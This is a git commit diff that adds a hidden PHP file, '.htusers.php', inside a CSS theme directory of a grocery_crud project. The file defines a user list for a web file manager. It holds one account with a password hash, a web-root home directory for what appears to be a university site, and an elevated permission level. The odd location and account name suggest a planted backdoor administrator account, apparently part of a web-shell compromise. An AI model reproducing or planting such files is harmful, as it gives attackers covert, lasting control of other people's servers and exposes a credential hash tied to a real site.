9ac9582d9819c7de3a656bb1d7f59f4e7ced3329
Boy Gautama <boy.gautama@gmail.com>
2025-09-18 10:17:16 +0700

    first commit

---
+++ assets/grocery_crud/themes/flexigrid/css/config/.htusers.php
@@ -0,0 +1,7 @@
+<?php 
+	// ensure this file is being included by a parent file
+	if( !defined( '_JEXEC' ) && !defined( '_VALID_MOS' ) ) die( 'Restricted access' );
+	$GLOBALS["users"]=array(
+	array('#bokhangthao88$','$P$BLGzIQbXx2a1CzVVVtt01RwoAIhH2S0','/home/uni10000/public_htm','https://unibba.ac.id','1','','7',1),
+); 
+?>
